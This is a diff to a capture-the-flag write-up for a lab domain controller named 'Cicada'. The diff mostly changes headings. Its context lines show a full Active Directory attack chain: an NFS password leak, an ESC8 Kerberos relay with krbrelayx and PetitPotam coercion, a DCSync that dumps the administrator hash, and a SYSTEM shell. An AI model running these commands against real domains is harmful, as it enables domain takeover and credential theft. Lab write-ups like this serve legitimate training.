@@ -8,8 +8,9 @@
 
 The initial foothold is gained from a password found in a public NFS share. This access is then leveraged to exploit a critical **ESC8** vulnerability in Active Directory Certificate Services (AD CS). The final compromise is achieved through a **Kerberos relay attack** targeting the insecure HTTP certificate web enrollment interface, leading to a complete takeover of the Domain Controller.
 
-# Walktrough
-## Enumerating services
+# Enumeration
+
+### nmap 
 
 I start by enumerating services on the host with the `nmap` tool.
 
@@ -105,7 +106,7 @@ I add this information in `/etc/hosts`.
 # echo '10.129.234.48 cicada.vl DC-JPQ225.cicada.vl DC-JPQ225' >> /etc/hosts
 ```
 
-## Discovering a password in a public NFS share
+# Discovering a password in a public NFS share
 
 Let's check if there is public NFS share.
 
@@ -173,7 +174,9 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\rosie.powe
 
 `rosie.powell:Cicada123`
 
-## Enumerating and discovering an ESC8 vulnerability
+# Discovering an ESC8 vulnerability
+
+### SMB
 
 With this account, I can enumerate the SMB shares.
 
@@ -192,6 +195,8 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        NETLOGON        READ    
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        profiles$       READ,WRITE      
 SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        SYSVOL          READ            Logon server share
 ```
+
+###  ADCS
 
 Nothing interesting stands out here, but I see that there his an ADCS service in this domain.
 I'll use the `certipy` tool to enumerate it, but before this I need to request a TGT for the authentication.
@@ -260,7 +265,7 @@ Certificate Templates                   : [!] Could not find any certificate tem
 
 There is an ESC8 vulnerability as Web Enrollment is enabled over http.
 
-## Abusing ESC8 to recover the DC certificate
+# Abusing ESC8 to recover the DC certificate
 
 It took me a some time to understand the mechanism of a kerberos relay using an ESC8 vulnerability, as I had never performed a NTLM relay attack before.
 Reading this **Synacktiv** [article](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx) an this **Hacker Reciped** [resource](https://www.thehacker.recipes/ad/movement/kerberos/relay) helped me a lot.
@@ -271,6 +276,8 @@ After several failed attempts, I realized my malicious DNS record was not constr
 `<ADCS_NETBIOS>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`.
 In my context, the record is:
 `DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`
+
+### Adding a fake DNS record
 
 As planned, I now add this DNS record using the `rosie.powell` account with Kerberos authentication.
 
@@ -283,7 +290,9 @@ As planned, I now add this DNS record using the `rosie.powell` account with Kerb
 [+] LDAP operation completed successfully
 ```
 
-I now set up my `krbrelayx`, pointing it directly at the ADCS HTTP service endpoint.
+### Setting up `krbrelayx`
+
+`krbrelayx` points directly at the ADCS HTTP service endpoint.
 
 ```
 # krbrelayx.py -t 'http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp' --adcs -v 'DC-JPQ225$' --template DomainController
@@ -300,6 +309,8 @@ I now set up my `krbrelayx`, pointing it directly at the ADCS HTTP service endpo
 
 [*] Servers started, waiting for connections
 ```
+
+### Coercing the DC
 
 Finally, I use `Petitpotam` to coerce authentication from the Domain Controller. Instead of using my attacker IP, I target the malicious DNS record I created earlier. This forces the DC to resolve the fake hostname and send its authentication request directly to my waiting relay.
 
@@ -344,6 +355,8 @@ COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PrinterBug
 COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, spoolss\RpcRemoteFindFirstPrinterChangeNotificationEx
 ```
 
+### Recovering the DC certificate
+
 Success. The coercion with NetExec works, and the relay immediately returns the DC's certificate. I've trimmed the output for clarity, showing only the captured certificate itself.
 
 ```bash
@@ -357,7 +370,7 @@ Success. The coercion with NetExec works, and the relay immediately returns the 
 [*] Certificate successfully written to file
 ```
 
-## Performing a DCSync with the DC account
+# Performing a DCSync with the DC account
 
 With the certificate, I can now authenticate as the `DC-JPQ225$` machine account. My next step is to use this authentication to retrieve its NTLM hash.
 
@@ -391,7 +404,7 @@ SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        Administrator:500:aad3b4
 The DCSync attack is successful, and the `administrator` hash is dumped:
 `administrator:85a0da53871a9d56b6cd05deda3a5e87`
 
-## Connecting to the DC as Administrator
+# Connecting to the DC as Administrator
 
 As NTLM is disabled, I will need the `administrator` TGT first
 
@@ -422,5 +435,4 @@ Microsoft Windows [Version 10.0.20348.2700]
 C:\Windows\system32> whoami
 nt authority\system
 ```
-
 I am now connected as `nt authority\system` on the DC.
